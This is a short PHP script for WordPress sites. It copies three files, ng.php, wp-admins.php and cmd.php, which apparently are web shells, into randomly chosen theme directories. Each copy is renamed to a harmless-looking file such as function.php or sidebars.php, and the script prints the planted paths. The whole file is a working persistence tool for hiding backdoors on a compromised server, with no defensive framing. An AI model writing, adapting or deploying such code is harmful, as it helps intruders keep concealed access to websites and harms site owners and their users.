<?php

$messages = array();

$to_move = array("ng.php","wp-admins.php","cmd.php");

$random_filename = array(
    "block-pattern.php",
    "function.php",
    "comment.php",
    "pages.php",
    "searches.php",
    "sidebars.php",
    "pages.php"
);

function get_themes() {
    $doc_root = $_SERVER['DOCUMENT_ROOT'];
    $theme_folder = "$doc_root/wp-content/themes";
    $themes_dir = array();
    if(is_dir($theme_folder) && is_writable($theme_folder)) {
        foreach(scandir($theme_folder) as $files) {
            $value = "$theme_folder/$files";
            if(is_dir($value) && $files !== '..' && $files !== '.') {
                array_push($themes_dir, "$value");
            }
        }
    }
    return $themes_dir;
}

function move_file() {
    global $themes_dir, $random_filename, $to_move;

    $copied = array();

    foreach($to_move as $file) {
        
        // select random file

        $num_file = array_rand($random_filename, 1);
        $f = $random_filename[$num_file];

        // random dir name 

        $num_dir = array_rand($themes_dir, 1);
        $dirname = $themes_dir[$num_dir];

        $value = "$dirname/$f";

        if(copy($file, $value)) {
            $copied["$file"] = $value;
        }

    }
    return $copied;
}

$themes_dir = get_themes();
$messages['themes_dir'] = $themes_dir;

$f = move_file();
$messages['copied'] = $f;

echo json_encode($messages);

?>